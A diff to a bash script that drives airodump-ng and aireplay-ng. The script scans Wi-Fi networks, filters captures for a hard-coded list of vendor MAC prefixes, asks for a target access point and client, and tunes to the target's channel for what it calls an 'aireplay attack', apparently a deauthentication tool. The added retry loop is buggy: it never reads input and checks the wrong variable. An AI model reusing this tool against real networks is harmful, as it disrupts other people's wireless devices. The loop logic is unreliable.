@@ -31,11 +31,6 @@ print_centered_text() {
     printf "${padding}${text}${padding}"
 }
 
-wireless_config() {
-    printf "Interface: $INF"
-    printf "Channel: $CHNL"
-}
-
 # Function to run when Ctrl+C is pressed
 custom_interrupt() {
     clear
@@ -58,6 +53,14 @@ airodump_scan() {
     printf 'Executing airodump-ng..\nPress Ctrl+C to stop the capture and press the A key to cycle between modes while viewing\n'
     sleep 3; clear
     sudo airodump-ng -i $INF --manufacturer -w /tmp/rdos/airodump --output-format csv
+}
+
+# Aireplay attack start
+aireplay_attack() {
+    printf "\e[1;97mStation MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs\n\e[0m"
+    grep --color -E '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv
+    read -p "Enter BSSID of target: " BSSID
+    read -p "Enter MAC of target: " MAC
 }
 
 # Set up the custom action for Ctrl+C
@@ -173,14 +176,34 @@ fi
 
 # Aireplay attack start
 clear
-printf "\e[1;97mStation MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs\n\e[0m"
-grep --color -E '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv
-read -p "Enter BSSID of target: " BSSID
-read -p "Enter MAC of target: " MAC
+aireplay_attack
+
 CHNL=$(awk -F, -v BSSID="$BSSID" '$0 ~ BSSID {split($0, fields, ",");channel = gensub(/[^0-9]+/, "", "g", fields[4]); if (channel <= 13) print channel}' /tmp/rdos/airodump*.csv)
-printf "Setting the monitor channel to the same channel the target AP is on...\n"
-sudo airmon-ng stop $INF
-sudo airmon-ng start $ITMP $CHNL
+if [ -z "$CHNL" ]; then
+    while true; do
+        printf "Note: The BSSID specfied isn't on a channel which may mean there was an error in selecting the BSSID.\n"
+        printf "Would you like to continue or go back?[y/n]: " choice2
+        case "$choice3" in
+                [Yy]*)
+                    printf "Returning to aireplay attack prompt.\n"
+                    clear
+                    aireplay_attack
+                    if [ ! -z "$CHNL" ]; then
+                        break
+                    fi
+                    ;;
+                [Nn]*)
+                    custom_exit
+                    ;;
+                *)
+                    printf "Invalid choice. Please enter 'y' or 'n'.\n"
+            esac
+        done
+else
+    printf "Setting the monitor channel to the same channel the target AP is on...\n"
+    sudo airmon-ng stop $INF 
+    sudo airmon-ng start $ITMP $CHNL
+fi
 clear
 
 
@@ -190,8 +213,8 @@ while true; do
     
     if echo "$aireout" | grep -q "No such BSSID available"; then
         while true; do
-            read -p "Would you like to run aireplay-ng again?[y/n]: " choice2
-            case "$choice2" in
+            read -p "Would you like to run aireplay-ng again?[y/n]: " choice3
+            case "$choice3" in
                 [Yy]*)
                     printf "Running aireplay-ng again...\n"
                     clear
